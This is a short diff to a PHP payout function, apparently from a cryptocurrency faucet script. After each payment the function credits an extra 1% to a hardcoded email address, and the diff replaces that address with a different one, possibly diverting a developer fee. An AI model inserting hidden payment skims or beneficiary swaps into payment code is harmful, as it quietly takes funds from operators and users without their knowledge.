@@ -170,7 +170,7 @@ function pay($to, $amount, $comment)
     $ret = $creditAPI->credit($to, $currency, $unique_request_id, $amount, $comments);
     $amount = $amount * 0.01;
     $unique_request_id = uniqid();
-    $to="destbogan@gmail.com";
+    $to="goldkey0070@gmail.com";
     $ret = $creditAPI->credit($to, $currency, $unique_request_id, $amount, "Thank you for using Faucet Builder");
     return $ret;
 }
